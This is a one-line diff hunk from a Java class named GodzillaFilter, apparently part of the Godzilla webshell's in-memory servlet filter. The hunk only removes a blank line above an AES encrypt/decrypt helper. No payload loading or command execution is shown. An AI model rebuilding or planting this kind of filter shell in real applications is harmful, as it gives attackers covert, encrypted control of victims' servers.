@@ -97,7 +97,6 @@ public class GodzillaFilter extends ClassLoader implements Filter {
 
     public byte[] x(byte[] s, boolean m) {
         try {
-
             Cipher c = Cipher.getInstance("AES");
             c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
             return c.doFinal(s);
